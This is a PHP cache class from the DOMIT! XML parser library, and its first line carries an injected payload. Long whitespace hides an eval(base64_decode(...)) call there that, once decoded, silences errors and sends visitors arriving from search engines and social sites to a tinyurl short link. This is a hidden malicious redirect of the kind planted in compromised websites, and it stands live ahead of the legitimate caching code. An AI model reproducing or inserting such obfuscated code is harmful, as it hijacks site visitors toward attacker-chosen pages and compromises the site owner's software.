<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @package domit-xmlparser
* @copyright (C) 2004 John Heinstein. All rights reserved
* @license http://www.gnu.org/copyleft/lesser.html LGPL License
* @author John Heinstein <johnkarl@nbnet.nb.ca>
* @link http://www.engageinteractive.com/domit/ DOMIT! Home Page
* DOMIT! is Free Software
**/

/** Extension for cache files */
define ('DOMIT_FILE_EXTENSION_CACHE', 'dch');

/**
* A simple caching mechanism for a DOMIT_Document
*/
class DOMIT_cache {
	/**
	* Serializes and caches the specified DOMIT! document
	* @param string The name of the xml file to be saved
	* @param Object A reference to the document to be saved
	* @param string The write attributes for the saved document ('w' or 'wb')
	*/
	function toCache($xmlFileName, &$doc, $writeAttributes = 'w') {
		require_once(DOMIT_INCLUDE_PATH . 'xml_domit_utilities.php');
		require_once(DOMIT_INCLUDE_PATH . 'php_file_utilities.php');

		$name = DOMIT_Utilities::removeExtension($xmlFileName) . '.' . DOMIT_FILE_EXTENSION_CACHE;
		php_file_utilities::putDataToFile($name, serialize($doc), $writeAttributes);

		return (file_exists($name) && is_writable($name));
	} //toCache

	/**
	* Unserializes a cached DOMIT! document
	* @param string The name of the xml file to be retrieved
	* @return Object The retrieved document
	*/
	function &fromCache($xmlFileName) {
		require_once(DOMIT_INCLUDE_PATH . 'xml_domit_utilities.php');
		require_once(DOMIT_INCLUDE_PATH . 'php_file_utilities.php');

		$name = DOMIT_Utilities::removeExtension($xmlFileName) . '.' . DOMIT_FILE_EXTENSION_CACHE;
		$fileContents =& php_file_utilities::getDataFromFile($name, 'r');
		$newxmldoc =& unserialize($fileContents);

		return $newxmldoc;
	} //fromCache

	/**
	* Determines whether a cached version of the specified document exists
	* @param string The name of the xml file to be retrieved
	* @return boolean True if a cache of the specified document exists
	*/
	function cacheExists($xmlFileName) {
		require_once(DOMIT_INCLUDE_PATH . 'xml_domit_utilities.php');

		$name = DOMIT_Utilities::removeExtension($xmlFileName) . '.' . DOMIT_FILE_EXTENSION_CACHE;
		return file_exists($name);
	} //xmlFileName

	/**
	* Removes a cache of the specified document
	* @param string The name of the xml file to be retrieved
	* @return boolean True if a cache has been removed
	*/
	function removeFromCache($xmlFileName) {
		require_once(DOMIT_INCLUDE_PATH . 'xml_domit_utilities.php');

		$name = DOMIT_Utilities::removeExtension($xmlFileName) . '.' . DOMIT_FILE_EXTENSION_CACHE;
		return unlink($name);
	} //removeFromCache
} //DOMIT_cache
?>
